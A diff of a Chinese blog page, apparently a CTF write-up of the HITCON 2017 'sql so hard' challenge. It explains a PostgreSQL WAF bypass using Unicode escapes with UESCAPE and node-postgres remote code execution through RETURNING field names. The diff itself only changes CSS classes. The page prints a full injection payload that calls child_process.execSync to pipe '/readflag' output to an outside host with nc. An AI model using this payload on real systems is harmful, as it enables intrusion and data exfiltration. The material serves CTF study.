@@ -130,7 +130,7 @@
 这样没有插入的话就不会查询到记录，即达到<strong>绕过waf</strong>的目的</p>
   </li>
   <li>或者使用postgreSQL支持将16进制的值转换成Unicode字符、并且可以自定义转译符的<a href="https://www.postgresql.org/docs/9.6/static/sql-syntax-lexical.html">特性</a>来将关键字全部替换掉, 从而达到<strong>绕过waf</strong>的目的, Eg: 国外大佬的<a href="https://github.com/sorgloomer/writeups/blob/master/writeups/2017-hitcon-quals/sql-so-hard.md">wp</a>(其中空格使用\t绕过,自定义转译符为感叹号)
-    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>','')\tON\tCONFLICT\t(username)\tDO\tUPDATE\tSET\tusername=''\tRETURNING\t1\tAS\tU&amp;"!005c!0027+(r=process.mainModule.require,l=!0022!0022)]!002f!002f"\tUESCAPE\t'!',\t1\tAS\tU&amp;"!005c!0027+(l+=!0022!002freadflag|nc!0020123.123!0022)]!002f!002f"\tUESCAPE\t'!',\t1\tAS\tU&amp;"!005c!0027+(l+=!0022.123.123!00201234!0022)]!002f!002f"\tUESCAPE\t'!',\t1\tAS\tU&amp;"!005c!0027+(r(!0022child_process!0022).execSync(l))]!002f!002f"\tUESCAPE\t'!';
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>','')\tON\tCONFLICT\t(username)\tDO\tUPDATE\tSET\tusername=''\tRETURNING\t1\tAS\tU&amp;"!005c!0027+(r=process.mainModule.require,l=!0022!0022)]!002f!002f"\tUESCAPE\t'!',\t1\tAS\tU&amp;"!005c!0027+(l+=!0022!002freadflag|nc!0020123.123!0022)]!002f!002f"\tUESCAPE\t'!',\t1\tAS\tU&amp;"!005c!0027+(l+=!0022.123.123!00201234!0022)]!002f!002f"\tUESCAPE\t'!',\t1\tAS\tU&amp;"!005c!0027+(r(!0022child_process!0022).execSync(l))]!002f!002f"\tUESCAPE\t'!';
 </code></pre></div>    </div>
   </li>
   <li>构造RCE代码<a href="https://node-postgres.com/announcements#2017-08-12-code-execution-vulnerability">2017-08-12 - code execution vulnerability</a>
@@ -143,11 +143,11 @@
   </li>
 </ul>
 
-<p>这里阅读 <a href="https://www.postgresql.org/docs/9.5/static/dml-returning.html">文档</a>, postgresql允许在insert或者update后选择一个或多个字段返回, 所以在这里就有可控字段名了, 使用格式 <code class="highlighter-rouge">insert into xx(aa,bb) values('cc','dd') returning  ee as ff;</code>
+<p>这里阅读 <a href="https://www.postgresql.org/docs/9.5/static/dml-returning.html">文档</a>, postgresql允许在insert或者update后选择一个或多个字段返回, 所以在这里就有可控字段名了, 使用格式 <code class="language-plaintext highlighter-rouge">insert into xx(aa,bb) values('cc','dd') returning  ee as ff;</code>
 最后就是构造RCE中P神在博客中提到的</p>
 <blockquote>
   <p>单双引号都不能正常使用，我们可以使用es6中的反引号
-<code class="highlighter-rouge">Function</code>环境下没有<code class="highlighter-rouge">require</code>函数, 不能获得<code class="highlighter-rouge">child_process</code>模块, 但是可以通过<code class="highlighter-rouge">process.mainModule.constructor._load</code>来代替require
+<code class="language-plaintext highlighter-rouge">Function</code>环境下没有<code class="language-plaintext highlighter-rouge">require</code>函数, 不能获得<code class="language-plaintext highlighter-rouge">child_process</code>模块, 但是可以通过<code class="language-plaintext highlighter-rouge">process.mainModule.constructor._load</code>来代替require
 一个fieldName只能有64位长度, 所以通过多个fieldName拼接来完成利用</p>
 </blockquote>
 
